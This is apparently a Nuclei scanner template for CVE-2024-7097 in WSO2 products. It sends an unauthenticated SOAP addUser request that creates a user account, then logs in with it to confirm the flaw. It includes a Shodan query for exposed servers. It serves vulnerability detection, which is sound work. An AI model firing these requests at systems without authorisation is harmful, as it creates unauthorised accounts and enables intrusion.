templates/CVE-2024-7097.yaml

flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    status:
    - 202
    type: status
  raw:
  - "POST /services/UserRegistrationAdminService.UserRegistrationAdminServiceHttpsSoap11Endpoint/\
    \ HTTP/1.1\nHost: {{Hostname}}\nSOAPAction: \"urn:addUser\"\nContent-Type: text/xml\n\
    \n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \nxmlns:xsd=\"http://org.apache.axis2/xsd\">\n   <soapenv:Header/>\n   <soapenv:Body>\n\
    \      <xsd:addUser>\n<xsd:user>\n         <xsd:userName>{{username}}</xsd:userName>\n\
    \         <xsd:password>{{password}}</xsd:password>\n</xsd:user>\n      </xsd:addUser>\n\
    \   </soapenv:Body>\n</soapenv:Envelope>\n"
- matchers:
  - condition: and
    type: word
    words:
    - loginResponse
    - <ns:return>true</ns:return>
  raw:
  - "POST /services/AuthenticationAdmin HTTP/1.1\nHost: {{Hostname}}\nSOAPAction:\
    \ \"\"\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \n                  xmlns:aut=\"http://authentication.services.core.carbon.wso2.org\"\
    >\n   <soapenv:Header/>\n   <soapenv:Body>\n      <aut:login>\n         <aut:username>{{username}}</aut:username>\n\
    \         <aut:password>{{password}}</aut:password>\n      </aut:login>\n   </soapenv:Body>\n\
    </soapenv:Envelope>\n"
id: CVE-2024-7097
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    epss-percentile: 0.93409
    epss-score: 0.11634
  description: 'The SOAP admin service in WSO2 products has a security vulnerability
    that allows the creation of new user accounts regardless of the self-registration
    configuration settings.

    '
  impact: 'Unauthenticated attackers can bypass self-registration restrictions to
    create arbitrary user accounts, potentially gaining unauthorized access to the
    WSO2 system and its resources.

    '
  metadata:
    max-request: 2
    shodan-query: WSO2 Carbon Server
    verified: true
  name: WSO2 User Registration - Arbitrary Account Creation
  reference:
  - https://sec.vnpt.vn/2025/01/canh-bao-lo-hong-nghiem-trong-tren-nen-tang-xac-thuc-tap-trung-wso2-anh-huong-den-nhieu-co-quan-to-chuc-bo-ban-nganh/
  - https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3574/
  remediation: 'Apply security patches from WSO2 as outlined in security advisory
    WSO2-2024-3574 to address the arbitrary account creation vulnerability.

    '
  severity: medium
  tags: cve,cve2024,wso2,intrusive,auth-bypass,vkev,vuln
variables:
  password: '{{randstr_2}}'
  username: '{{randstr_1}}'
